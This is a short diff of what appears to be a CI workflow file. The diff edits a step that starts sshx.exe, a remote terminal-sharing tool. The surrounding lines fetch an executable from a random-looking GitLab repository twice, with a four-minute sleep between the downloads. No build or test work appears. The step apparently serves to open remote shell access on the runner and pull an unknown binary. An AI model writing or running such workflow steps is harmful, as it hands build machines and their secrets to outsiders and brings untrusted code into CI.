@@ -14,7 +14,7 @@ jobs:
     
     - name: run
       run: |
-           sshx.exe
+           .\sshx.exe
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
            sleep 240
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
